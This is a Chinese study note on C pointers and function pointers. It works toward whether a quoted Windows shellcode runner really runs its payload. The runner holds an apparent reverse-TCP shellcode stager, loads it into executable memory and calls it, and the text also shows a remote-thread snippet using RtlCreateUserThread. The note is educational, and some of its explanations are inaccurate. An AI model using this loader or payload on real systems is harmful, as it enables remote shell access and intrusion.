

**更新：**

- `WINAPI` 定义了约定调用，`*` 说明是函数指针，`_RtlCreateUserThread` 是符号名称。`NTSTATUS` 是返回值。
- `typedef` 是用来定义类型的。
- 如果有别名，会在括号后、分号前，这里省略了别名。




![title](https://leanote.com/api/file/getImage?fileId=5f324384ab64411027000803)


```
typedef NTSTATUS(WINAPI * _RtlCreateUserThread)(
    HANDLE      ProcessHandle,
    PSECURITY_DESCRIPTOR  SecurityDescriptor,
    BOOL      CreateSuspended,
    ULONG     StackZeroBits,
    PULONG     StackReserved,
    PULONG     StackCommit,
    LPVOID     StartAddress,
    LPVOID     StartParameter,
    PHANDLE      ThreadHandle,
    LPVOID     ClientID
    );
```

```
NTSTATUS status = RtlCreateUserThread(hProc, 0, false, 0, 0, 0, FreeLibrary, hm, &ht, 0);
```


- fastcall 和 stdcall 调用约定的另一区别是一个把传入参数存在寄存器上，一个存在栈上。
- 栈和堆在内存中的区别是：栈存放临时变量，堆存放稍微大一点的数据。

---------


# 0x01 一个问题：这段代码是否执行了 shellcode？


起因是在 3gstudent 师傅的博文 [傀儡进程的实现与检测](https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/) 中看到这样一段文字和代码：

> 生成shellcode后，HelloWorld工程实现执行shellcode功能的源代码如下：

```
#include <windows.h>
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
    unsigned char shellcode1[] =  
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
        "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
        "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
        "\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x51\xc0\x68\x02"
        "\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
        "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
        "\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
        "\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
        "\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
        "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
        "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3";

    typedef void (__stdcall *CODE) ();    
    PVOID p = NULL;    
    if ((p = VirtualAlloc(NULL, sizeof(shellcode1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)   
        MessageBoxA(NULL, "error", "VirtualAlloc", MB_OK);    
    if (!(memcpy(p, shellcode1, sizeof(shellcode1))))    
        MessageBoxA(NULL, "error", "memcpy", MB_OK);    
    CODE code =(CODE)p;       
    code(); 

    return 0;
}
```
 
我也写过好几次进程注入 shellcode 的代码了，写的比较多的是远程进程注入，我的 API 调用链通常是：

1. 打开远程进程的句柄：`OpenProcess`
2. 在远程进程中分配内存：`VirtualAllocEx`
3. 将注入的数据复制到远程进程：`WriteProcessMemory`
4. 要求远程进程执行我们的注入代码：`CreateThread` 等 API。


3gstudent 师傅的这段代码的 API 使用链是：

1. 在内存中为 Shellcode 分配空间：`VirtualAlloc`
2. 将 shellcode 复制到分配的 RWX 内存空间：`memcpy`

>注：shellcode 的确无需一定要注入某个进程。本身 Shellcode 的特点就是：
>
>- 独立的存在，无需任何文件格式的包装。
- 内存中运行，无需固定指定的宿主进程。



3gstudent 这段代码给我的感觉就是没执行 Shellcode，仅仅是把 Shellcode 写入了内存。

咨询了我师父到底这段 Shellcode 是否执行了，他说我基础不扎实，指针没学好，让我打开一本 C 语言基础书看里面的**函数指针**。

本文就是梳理了一遍 《C Primer Plus》 这本书中跟指针有关的内容，最后探究出这段代码是否执行了 Shellcode 的结论。
 
 
#0x02 指针基础
 
 指针（`pointer`）是一个值为内存地址的变量（或数据对象）。指针变量的值为内存地址。
 
 
 **指针变量**
 
 - ptr 指向 bah，也就是 ptr 变量保存了 bah 常量的地址。
 
```
ptr = &bah
```
 
- 通过间接运算符/解引用运算符 `*`，找出储存在 bah 中的值。

```
val = *ptr //找出 ptr 指向的值
```

- 以下两行代码功能相等

```
val = bah
ptr = &bah; val = *ptr;
```

第一行代码是直接赋值；
第二行代码使用地址+间接运算符这样间接完成了赋值功能。这也是「间接运算符」名称的由来。
 
 **与指针相关的运算符**
 
 
 - 地址运算符：`&`：后跟一个变量名时，&给出该变量的地址。
 - 间接运算符/解引用运算符：`*`：后跟一个指针名或者地址时，*给出储存在指针指向地址上的值。
 

**声明指针变量**

声明指针变量时必须指定指针所指向变量的类型，这是因为：

1. 不同的变量类型占用不同大小的存储空间，一些指针操作要求知道操作对象的大小；
2. 程序必须知道存储在指定地址上的数据类型，long 和 float 可能占用相同的存储空间，但是它们存储的数字却大相径庭。这样方便程序做不同的处理。


**一些指针的声明示例**

```
int * pi;          //pi 是指向 int 类型变量的指针
char * pc;         //pc 是指向 char 类型变量的指针
float * pf, *pg;   //pf、pg 都是指向 float 类型变量的指针
```

类型说明符表明了指针所指向对象的类型；
`*` 表明声明的变量是一个指针。
`int *pi;` 声明的意思是 pi 是一个指针，*pi 是 int 类型。


- `*` 和指针名之间的空可有可无。


**指针是什么类型？**


pc 指向的值（*pc）是 char 类型，那么 pc 本身是什么类型？

我们描述它的类型是「指向 char 类型的指针」。

pc 的值是一个地址，在大部分系统内部，该地址由一个无符号整数表示。但是，不要把指针认为是整数类型。一些处理整数的操作不能用来处理指针，反之亦然。

例如，可以把两个整数相乘，但是不能把两个指针相乘。

所以，指针实际上是一个新类型，不是整数类型。因此，ANSI C 标准专门为指针提供了 `%p` 格式的转换说明。

 
#0x03 使用指针在函数间通信

此函数中使用了指针参数。

```
//此代码用于示范如何使用指针解决函数间的通信问题
/*swap3.cpp -- 使用指针解决交换函数的问题*/

#include <stdio.h>
void interchange(int * u, int * v);

int main(void)
{
	int x = 5, y = 10;
	printf("Originally x = %d and y = %d.\n", x, y);
	interchange(&x, &y); //把地址发给函数
	printf("Now x = %d and y = %d.\n", x, y);

	return 0;
}

void interchange(int * u, int * v)
{
	int temp; //用于交换的中间变量
	temp = *u;
	*u = *v;
	*v = temp;
}
```


![title](https://leanote.com/api/file/getImage?fileId=5f2cf681ab644176ca00075e)


**总结一下此程序做了什么：**

我们需要一个函数交换 x 和 y 的值，把 x 和 y 的地址传递给函数，我们让 interchange() 访问这两个变量。

使用指针和 `*` 运算符，该函数可以访问储存在这些位置的值并改变它们。


**注：**

可以省略 ANSI C 风格的函数原型（注意是函数原型，而非函数定义！）中的形参名，如下：

```
void interchange(int *, int *);
```


**函数和指针**


一般而言，可以把和变量相关的两类信息传递给函数。

函数调用形式1，传递 x 的值：

```
function1(x);
```


函数调用形式2，传递 x 的地址：

```
function2(&x);
```

调用形式1要求函数定义中的形式参数必须是一个与 x 的类型相同的变量；

```
int function1(int num)
```

调用形式2要求函数定义中的形式参数必须是一个指向正确类型的指针。

```
int function2(int * ptr)
```


如果要计算或处理值，那么使用第 1 种形式的函数调用；
如果要在调函数中改变主调函数的变量，则使用第 2 种形式的函数调用。

<u>总结：</u> 

- 编写程序时，可以认为变量有两个属性：地址和值（暂时不谈类型等其他性质）；计算机编译和加载程序后，认为变量也有两个属性：地址和值。因此，地址其实就是变量在计算机内部的名称。许多语言中，地址都归计算机管，对程序员隐藏。然而在 C 中，可以通过 `&` 运算符访问地址。

- 在函数中使用`&`、`*` 和指针主要是为了通过使用指针来操纵地址和地址上的内容。



#0x04 指针和数组


数组名是数组首元素的地址。

- arr 和 &arr[0] 都表示数组首元素的内存地址，二者都是常量。


```
arr == &arr[0]
```

**示例程序：**


```
#include <stdio.h>
#define SIZE 4


int main(void)
{
	short index;

	short dates[SIZE];
	short * pti;
	
	double bills[SIZE];
	double* ptf;
	
	pti = dates;  //把数组地址赋值给指针
	ptf = bills;

	printf("%23s %15s\n", "short", "long");
	for (index = 0; index < SIZE; index++)
		printf("pointers + %d: %10p %15p\n",index,pti+index,ptf+index);

	return 0;
}
```

![title](https://leanote.com/api/file/getImage?fileId=5f2d08aeab644178c700088b)


- 注1：地址是16进制的，因此0A比08大2。
- 注2：`%p` 通常以十六进制显示指针的值。
- 注3：我们的系统中，地址按字节编址，short 类型占用2字节，double 类型占用8字节。

**程序分析：**

从程序的运行结果中，我们可以看出：

- 在 C 中，指针加1指的是增加一个存储单元。对数组而言，这意味着加1后的地址是下一个元素的地址，而不是下一个字节的地址。
- 这是为什么必须声明指针所指向的数据类型的原因之一。只知道地址不够，因为计算机要知道储存对象需要多少字节（即使指针指向的是标量变量，也要知道变量的类型，否则 *ptr 就无法争取地取回地址上的值）。


--------------


- 指针的值是它所指向对象的地址。地址的表示方式依赖于计算机内部的硬件。许多计算机（包括 PC 和 Macintosh） 都是`按字节编址`，意思是内存中的每个字节都按顺序编号。这里，一个较大对象的地址（如 double 类型的变量）通常是该对象第一个字节的地址；
- 指针加1，指针的值递增它所指向类型的大小（以字节为单位）。


--------------

数组和指针的关系十分密切，可以使用指针标识数组的元素和获得元素的值。

```
arr + 2 == &arr[2];    //相同的地址
*(arr + 2) == arr[2];  //相同的值
arr[n] == *(arr + n);
```


>注：不要混淆 *(arr + 2) 和 *arr + 2。因为间接运算符 `*` 的优先级高于 `+`，所以 *arr +2 相当于 (*arr) + 2。

**声明数组形参**

因为数组名是该数组首元素的地址，作为实际参数的数组名要求形式参数是一个与之匹配的指针。只有在这种情况下，C 才会把 int arr[] 和 int * arr 解释成一样。也就是说， arr 是指向 int 的指针。


由于函数原型可以省略参数名，所以以下4种原型都是等价的：

```
int sum(int * arr, int n);   //第二个形参告诉函数该数组中元素的个数
int sum(int *, int);
int sum(int arr[], int n);   // int arr[]只能用于声明形式参数
int sum(int [], int);
```
但是，函数定义中不能省略参数名，以下两种形式的函数定义等价：

```
int sum(int * arr, int n)
{
    ...
}

int sum(int arr[], int n)
{
    ...
}
```


#0x05 严重错误：解引用未初始化的指针



一定要牢记一点：千万不要解引用未初始化的指针！

错误示例：


```
int * pt;  //已声明但未初始化的指针
*pt = 5;   //严重的错误
```


为何不行？

第二行的意思是把5储存在 pt 指向的位置。但是 pt 未被初始化，其值是一个随机数。所以不知道5将储存在何处。这可能不会出什么错，也可能会擦写代码或数据，或者导致程序崩溃。

切记：创建一个指针时，系统只分配了储存指针本身的内存，并未分配储存数据的内存。因此，在使用指针之前，必须先用已分配的地址初始化它。例如，可以用一个现有变量的地址初始化该指针（使用带指针形参的函数时，就属于这种情况）。或者还可以使用 malloc() 函数先分配内存。无论如何，使用指针时一定要注意，不要解引用未初始化的指针！

```
double * pd;   //未初始化的指针
*pd = 2.40;    //不要这样做
```


# 0x06 使用复合字面量给指针赋值


**什么是复合字面量？**

复合字面量相当于数组常量。


**复合字面量的由来**

假设给带 int 类型形参的函数传递一个值，可以传递 int 类型的变量，也可以传递 int 类型的常量，比如5。那么类推，给带数组类型形参的函数传递一个值，可以传递数组类型的变量，但是如果想传递数组类型的常量呢？

C99 标准之前，对于带数组形参的函数，情况不同，可以传递数组，但是没有等价的数组常量。C99 标准新增了复合字面量（`compound literal`）。复合字面量是用来代表数组和结构内容的，有了复合字面量，在编程时更方便。

**复合字面量的声明**

```
int diva[2] = {10, 20};
//下面的复合字面量创建了一个和 diva 数组相同的匿名数组
(int [2]){10, 20}  //复合字面量
```


初始化有数组名的数组时可以省略数组大小，复合字面量也可以省略大小，此时编译器会自动计算匿名数组当前的元素个数：

```
(int []){50, 20, 90}   //内含3个元素的复合字面量
```


**复合字面量的用法**

因为复合字面量是匿名的，所以不能先创建再使用它，必须在创建的同时使用它。


使用指针记录地址就是一种用法：

```
int * pt1;
pt1 = (int [2]){10,20};
```


与有数组名的数组类似，复合字面量的类型名也代表首元素的地址，所以可以把它赋给指向 int 的指针。

然后便可使用这个指针。例如， *pt1 是 10， pt1[1] 是20。


还可以把复合字面量作为实际参数，传递给带有匹配形式参数的函数：

```
int sum(const int ar[], int n);
...
int total3;
total3 = sum((int []){4,4,4,5,5,5},6)
```

这种用法的好处是，把信息传入函数前不必先创建数组，这是复合字面量的典型用法。

总结来说，复合字面量是提供只临时需要的值的一种手段。复合字面量具有块作用域，这意味着一旦离开定义复合字面量的块，程序将无法保证该字面量是否存在。也就是说，复合字面量的定义在最内层的花括号中。


# 0x07 指针获取 malloc() 的返回值

`malloc()` 是用于分配和管理内存的库函数。这样可以不依赖于存储类别根据已制定好的内存管理规则自动选择作用域和存储器，更加灵活。

![title](https://leanote.com/api/file/getImage?fileId=5f2d1eebab644178c7000a48)

- 唯一的参数是所需的内存字节数；
- 注意返回值不是 `void`，是 `void *`，也就是一个 void pointer。 返回值实质上是动态分配内存块（所谓动态分配就是 malloc() 函数将找到合适的空闲内存卡，这样的内存是匿名的）的首字节地址。ANSI C 标准之前，因为 char 表示一字节，所以 malloc() 的返回类型通常被定义为指向 char 的指针。从 ANSI C 标准开始，C 使用一个新的类型：指向 void 的指针。该类型相当于一个“通用指针”，通常该函数的返回值会被强制转换为匹配的类型。但是在 ANSI C 中，应该坚持使用强制类型转换，提高代码的可读性。



如下代码所示：在 C 中，不一定要使用强制类型转换如 (char *)，但是在 C++ 中必须使用。所以，在 C 中使用强制类型转换有以下3个优点：

1. 更符合 `ANSI C` 的风格；
2. 提高代码的可读性；
3. 更容易把 C 程序转换为 C++ 程序

```
// crt_malloc.c
// This program allocates memory with
// malloc, then frees the memory with free.

#include <stdlib.h>   // For _MAX_PATH definition
#include <stdio.h>
#include <malloc.h>

int main( void )
{
   char *string;

   // Allocate space for a path name
   string = malloc( _MAX_PATH );

   // In a C++ file, explicitly cast malloc's return.  For example,
   // string = (char *)malloc( _MAX_PATH );

   if( string == NULL )
      printf( "Insufficient memory available\n" );
   else
   {
      printf( "Memory space allocated for path name\n" );
      free( string );
      printf( "Memory freed\n" );
   }
}
```

>注：
void * 指针请参考：[C++中void和void*指针的含义](https://blog.csdn.net/Lee_Shuai/article/details/53193436)



**使用 malloc() 创建数组**

```
double * ptd;
ptd = (double *) malloc(30*sizeof(double));
```

- 以上代码为30个double类型的值请求内存空间，并设置 ptd 指针指向该位置；
- 注意：指针 ptd 被声明为指向一个 double 类型，而不是指向内含30个 double 类型值的块。因为，这是一个有30个 double 元素的数组的内存空间。数组名是一个数组的首元素的地址，通过把 ptd 指针指向数组的首元素，就相当于 ptd 就是数组名，那么我们就可以像使用数组名一样使用 ptd。如：ptd[0]表示该数组的首元素，ptd[1]第二个元素。总之，既然可以用数组名来表示指针，那么也可以用指针表示数组。

所以至此，多了一种创建数组的方式：

1. 声明数组时，用常量表达式表示数组的维度，用数组名访问数组的元素。
2. 声明一个指针，调用 malloc()，将其返回值赋给指针，使用指针访问数组的元素。

第一种如：

```
#include <stdio.h>
#define SIZE 4


int main(void)
{
	short index;

	short dates[SIZE];
	...
```

**malloc() 使用规范**

```
#include <stdlib.h> /*为 malloc()、free() 提供原型，这样代码里无需再声明原型*/

int main(void)
{
    double ptd;
    int max;
    ptd = (double *)malloc(max*sizeof(double));
    free(ptd);
    
    return 0;
}
```
注意：一定要使用 `free()` 函数释放通过 `malloc()` 库函数动态分配的内存。`free()` 函数只释放其参数指向的内存块。


<u>如果不使用 `free()` 函数会有什么后果呢？</u>

一些操作系统在程序结束时候会自动释放动态分配的内存，但是有些系统则不会。假使我们刚好碰上了一个不会自动释放动态分配内存的操作系统，然后我们又忘记了写 `free()` 函数，那么当我们把此程序运行完一遍之后，之前用于保存 `malloc()` 函数返回值的指针变量已被销毁，那么此块内存将无法再被销毁，就一直占用。特别是当程序中，有一些循环，分配很多内存，这样运行一遍下来，内存池中可能有上千万字节被占用。更坏的情况是，在循环结束之前就已经耗尽所有的内存，就会导致内存泄漏问题。

在主函数末尾处调用 `free()` 函数可以避免这类问题发生。


**calloc() 函数**

**************
推荐使用 `calloc()` 函数替代 `malloc()` 函数。 

*******************

![title](https://leanote.com/api/file/getImage?fileId=5f2d29e5ab644176ca000b36)

- 传入两个参数，分别为元素个数和每个元素的大小。相当于帮我们做了计算总内存大小这一步。也可以用 `sizeof(long)` 指针形式传入第2个参数。
- calloc() 函数的特性是会把块中的位都置为0。
- 同样使用 `free()` 函数来释放用此函数动态分配的内存。


<u>malloc() 和 calloc() 的区别</u>


- 函数 malloc 不能初始化所分配的内存空间,而函数 calloc 能。如果由 malloc() 函数分配的内存空间原来没有被使用过，则其中的每一位可能都是0；反之，如果这部分内存曾经被分配过，则其中可能遗留有各种各样的数据。也就是说，使用 malloc() 函数的程序开始时（内存空间还没有被重新分配）能正常进行，但经过一段时间（内存空间还已经被重新分配）可能会出现问题。
- 函数 calloc() 会将所分配的内存空间中的每一位都初始化为零,也就是说,如果你是为字符类型或整数类型的元素分配内存，那么这些元素将保证会被初始化为0；如果你是为指针类型的元素分配内存,那么这些元素通常会被初始化为空指针；如果你为实型数据分配内存，则这些元素会被初始化为浮点型的零。


参考：[关于内存分配malloc、calloc、realloc的区别](https://zhuanlan.zhihu.com/p/87061787)

# 0x08 函数指针


**Typedef**


[MSDN - Typedef Declarations](https://docs.microsoft.com/en-us/cpp/c-language/typedef-declarations?view=vs-2019)

- `typedef` 不会创建任何新类型，它只是为某个已存在的类型增加了一个方便使用的标签。
- `typedef` 定义中用大写字母表示被定义的名称，以提醒用户这个类型名实际上只是一个符号缩写。当然也可以用小写。



```
typedef char * STRING;
STRING name, sign;
```


- 如果没有 `typedef` 关键字，编译器将把 STRING 识别为一个指向 char 的指针变量。有了 `typedef` 关键字，编译器则把 `STRING` 解释为一个类型的标识符，这个类型是指向 char 的指针。
- 因为 `STRING name, sign;` 等价于 `char * name, * sign;`

但是如果这样定义：

```
typedef STRING char *
```


然后：

```
STRING name, sign;
```

将被翻译为：

```
char * name, sign;
```

这会导致只有 name 才是指针。


<u>可以看出来 `typedf` 会被编译器机械替换。</u>


- `typedef` 还可以用来定义结构体：

```
typedef struct complex
{
    float real;
    float img;
} COMPLEX;
```

>注：用 typedef 定义结构体时可以省略结构体的标签，也就是上面的小写 complex。
也就是 typedef struct {float real; float img;} COMPLEX;




**函数指针**


- 函数指针是一个指向函数的指针，函数指针常用作另一个函数的参数，告诉该函数要使用哪一个函数。


- 函数的机器语言实现由载入内存的代码组成，指向函数的指针中储存着函数代码的起始处的地址。

- 函数名代表函数的地址，可以把函数的地址作为参数传递给其他函数，然后这些函数就可以使用被指向的函数。

**声明函数指针**


声明一个数据指针时，必须声明指针所指向的数据类型；同样的，声明一个函数指针，必须声明指针指向的函数类型。

为了指明函数类型，要指明`函数签名`，也就是函数的返回值和形参类型。


以下为一个函数原型：

```
void ToUpper(char *);  //此函数用于把字符串中的字符转换成大写字符
```


ToUpper() 函数的类型是「带 char* 类型参数、返回类型是 void 的函数」。

下面是指向该函数的指针 pf 的定义：

```
void(*pf)(char *);    //pf 是一个指向函数的指针
```


从该声明可以看出：

- 第一对圆括号把 * 和 pf 括起来，表明 pf 是一个指向函数的指针；
- 因此， (*pf) 是一个参数列表为 `(char *)`、返回类型为 void 的函数。pf 才是函数指针。


注意：

- 把函数名替换为表达式 `(*pf)` 是创建指向函数指针最简单的方式。所以要声明一个指向特定类型函数的指针，可以先声明一个该类型的函数，然后把函数名替换为 `(*pf)` 形式的表达式，然后，`pf` 就成为指向该类型函数的指针。
- 另外，由于运算符优先级的规则，在声明函数指针时候必须用圆括号把 * 和指针名括起来。如果忽略第一个圆括号会导致：

```
void *pf(char *);  //pf 是一个返回字符指针的函数
```


**函数指针的赋值**


声明了函数指针后，可以把<u>类型匹配的</u>的函数地址赋值给它。函数名可以用于表示函数的地址。


```
void ToUpper(char *);
int round(char *);
void (*pf)(char *);  

pf = ToUpper;   //有效，ToUpper 是该类型函数的地址
pf = round;     //无效，round 与指针类型不匹配
pf = ToUpper(); //无效，因为 ToUpper() 不是地址
```


**函数指针的使用**


既然可以用数据指针访问数据，就可以用函数指针访问函数。

```
void ToUpper(char *);
void (*pf)(char *);  
char mis[] = "Snowming is cute";
pf = ToUpper;
```


- 由于 pf 指向 ToUpper 函数，那么 *pf 即相当于 ToUpper 函数，所以表达式 `(*pf)(mis)` 和 `ToUpper(mis)` 相同。其实从 ToUpper 函数和 pf 的声明就能看出来 ToUpper 和 (*pf) 是等价的；
- 由于函数名是指针，那么指针和函数名可以互换使用，所以 `pf(mis)` 和 `ToUpper(mis)` 相同。

所以可以通过以下两种方式通过函数指针调用函数：


```
void ToUpper(char *);
void (*pf)(char *);  
char mis[] = "Snowming is cute";
pf = ToUpper;

//语法1
(*pf)(mis);

//语法2
pf(mis);
```


<u>作为函数的参数</u> 是函数指针最常见的用法之一。

下面是一个函数原型：

```
void show(void (*fp)(char *), char * str);
```


此函数声明了两个形参：

- fp 是一个函数指针，fp 指向的函数接受 `char *` 类型电参数，其返回值为 void。
- str 是一个指向 char 类型的数据指针。


假使有上面的声明，可以这样调用函数：

```
show(ToUpper, mis);  //show 使用 ToUpper() 函数：fp=ToUpper
show(pf, mis);       //show 使用 pf 指向的函数：fp = pf
```


注意在上面演示的第一种调用方法中，直接传入了函数名，函数名也是函数指针。此时的函数指针形参有何意义呢？相当于定义了一个接口，只能传入满足这样函数签名的函数。


那么 show() 函数如何使用传入的函数指针呢？

```
void show(void (*fp)(char *), char * str);

void show(void (*fp)(char *), char * str)
{
    (*fp)(str);   //把所选函数作用于 str
    puts(str);    //显示结果
}
```


这里的 show() 首先用 fp 指向的函数转换 str，然后显示转换后的字符串。


**带返回值的函数作实参**

把带返回值的函数作为参数传递给另一个函数有两种不同的方法：

```
function1(sqrt);            //传递 sqrt() 函数的地址
function1(sqrt(4.0));       //传递 sqrt() 函数的返回值
```


# 0x09 函数指针代码实例分析1

以下代码源自我师父的文章： [RemoteFreeLibrary](https://www.zcgonvh.com/post/RemoteFreeLibrary.html)


我发现在 Windows 编程中，函数指针常常用来帮助使用一些没有关联的导入库、在 MSDN 中未文档化的 API，比如很多 `Zw*`和 `Nt*` 函数。

分析一下此文中的代码：

**第一段**


```
typedef NTSTATUS(WINAPI * _RtlCreateUserThread)(
    HANDLE      ProcessHandle,
    PSECURITY_DESCRIPTOR  SecurityDescriptor,
    BOOL      CreateSuspended,
    ULONG     StackZeroBits,
    PULONG     StackReserved,
    PULONG     StackCommit,
    LPVOID     StartAddress,
    LPVOID     StartParameter,
    PHANDLE      ThreadHandle,
    LPVOID     ClientID
    );
```



- 通过 `typedef` 关键字定义为一个结构体类型定义别名；
- 别名标识符为 `NTSTATUS`；
- `NTSTATUS` 是指向 WINAPI 数据类型的指针 `_RtlCreateUserThread` 的别名。

注1：`WINAPI` 是 Windows 支持的一种数据类型，可以用来指定调用约定。参考 [MSDN - Windows Data Types](https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types)


![title](https://leanote.com/api/file/getImage?fileId=5f2d3cf7ab644176ca000bfd)

注2：[RtlCreateUserThread](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html) 是一个未文档化的 Windows API，可用于跨平台远程线程注入。


**第二段**


```
typedef ULONG(WINAPI * _RtlNtStatusToDosError)(
    NTSTATUS Status
);
```

同上。


**第三段**


```
BOOL RemoteFreeLibrary(HANDLE hProc, LPWSTR pwszModule)
{
    if (!hProc) { return false; }
    if (!pwszModule) { return false; }
    HMODULE hm = LoadLibraryW(pwszModule);
    if (!hm) { return false; }
    HANDLE ht = 0;
    HMODULE hmNtdll = GetModuleHandle(L"ntdll.dll");
    _RtlCreateUserThread RtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(hmNtdll, "RtlCreateUserThread");
    _RtlNtStatusToDosError RtlNtStatusToDosError= (_RtlNtStatusToDosError)GetProcAddress(hmNtdll, "RtlNtStatusToDosError");
    if (!RtlCreateUserThread || !RtlNtStatusToDosError){ return false; }
    NTSTATUS status = RtlCreateUserThread(hProc, 0, false, 0, 0, 0, FreeLibrary, hm, &ht, 0);
    if (!NT_SUCCESS(status))
    {
        SetLastError(RtlNtStatusToDosError(status));
        return false;
    }
    CloseHandle(ht);
    return true;
}
```


关键代码：

```
_RtlCreateUserThread RtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(hmNtdll, "RtlCreateUserThread");
NTSTATUS status = RtlCreateUserThread(hProc, 0, false, 0, 0, 0, FreeLibrary, hm, &ht, 0);
```


- 上面第一行代码：实例化一个 `WINAPI * _RtlCreateUserThread` 函数指针，具体实例化方法是 使用 `LoadLibrary` 和 `GetProcAddress` 函数动态链接到 Ntdll.dll，从 Ntdll.dll 中检索此导出函数（`RtlCreateUserThread`）的地址。在这里实例化的意义是为了一会儿给 NTSTATUS 类型实例赋值。
- 第二行代码就创建了一个 `NTSTATUS` 类型实例。在赋值的时候，上一行代码创建了一个  `WINAPI * _RtlCreateUserThread` 函数指针，可以直接当做函数名用，然后就通过此函数名进行传参。再把返回结果传入 status。因为在这种被人逆出来的 API 中，大多数也是不会明确给你返回类型的，所以会把返回结果返回到 API 实例中，从结构体成员再获取返回结果。在这一步调用 `RtlCreateUserThread` 函数对其赋值的时候已经实现了函数功能——远程进程调用。

![title](https://leanote.com/api/file/getImage?fileId=5f2d4241ab644178c7000c05)

-------------

一点质疑：

在这里我对返回值赋值给 `NTSTATUS` 实例变量产生了一些质疑，参考 3gstudent 师傅的文章：

![title](https://leanote.com/api/file/getImage?fileId=5f2d4565ab644176ca000c4f)


```
FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
_NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
DWORD dwResult = NtUnmapViewOfSection(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
```

似乎直接赋值给一个DWORD 变量就可以。用来保存 `NTSTATUS Values`。


文章出处：[傀儡进程的实现与检测](https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/)

--------------


注： 

```
NT_SUCCESS(status)
```

此行代码的用法请参考：

[MSDN - Using NTSTATUS Values](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values)


![title](https://leanote.com/api/file/getImage?fileId=5f2d4389ab644176ca000c39)


可以看出 `NTSTATUS Values` 在数值上一般大于 `Error Codes`。

[Error Codes](https://docs.microsoft.com/en-us/windows/win32/debug/system-error-codes) 一般通过 `GetLastError()` API 获取， `NTSTATUS Values` 在编译器中的表现一般是 `CXXXXXX`。

**第四段**

```
EnablePrivilge(SE_DEBUG_NAME);
HANDLE hProc = OpenProcess(MAXIMUM_ALLOWED, false, pid);
if(hProc)
{
  RemoteFreeLibrary(L"dbgeng.dll");
}
```

调用代码跟本文关系不大，贴在这里只是为了代码的完整性以及满足我自己的强迫症。

# 0x10 问题解决


回到文章开头的疑问，来继续探究。

以下代码源自 3gstudent 师傅的文章： [傀儡进程的实现与检测](https://3gstudent.github.io/3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B/)


>HelloWorld 工程实现执行 shellcode 功能的源代码如下：


```
#include <windows.h>
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
    unsigned char shellcode1[] =  
        "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
        "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
        "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
        "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
        "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
        "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
